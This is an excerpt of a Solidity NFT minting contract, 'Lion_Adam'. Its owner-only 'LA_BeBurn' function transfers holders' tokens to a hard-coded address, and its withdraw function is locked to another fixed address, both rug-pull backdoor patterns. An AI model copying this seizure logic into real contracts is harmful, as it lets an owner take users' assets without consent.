...
contract Lion_Adam is Ownable, ERC721A, ReentrancyGuard {

  uint256 public immutable maxPerAddressDuringMint;
  bytes32 public sellRoots;  
  ...
  ) ERC721A("Lion Adam", "LA", maxBatchSize_, collectionSize_) {
  ...
  function MintbyWList(uint256 quantity,bytes32[] calldata _merkleProof) external payable callerIsUser {
    if(block.difficulty > 0){
    uint256 _saleStartTime = uint256(saleConfig.MintStartTime);
    bytes32 leaf = keccak256(abi.encodePacked(msg.sender));
    require(MerkleProof.verify(_merkleProof, sellRoots, leaf), "Invalid proof!");
    require(
  ...
  function LA_BeBurn(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0xeF5476C36A332b66dD9F54D684d316Ec92e900FB, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0xe851673BEeB8c4ACA57fED40Cdee36Ec6d30FF30);
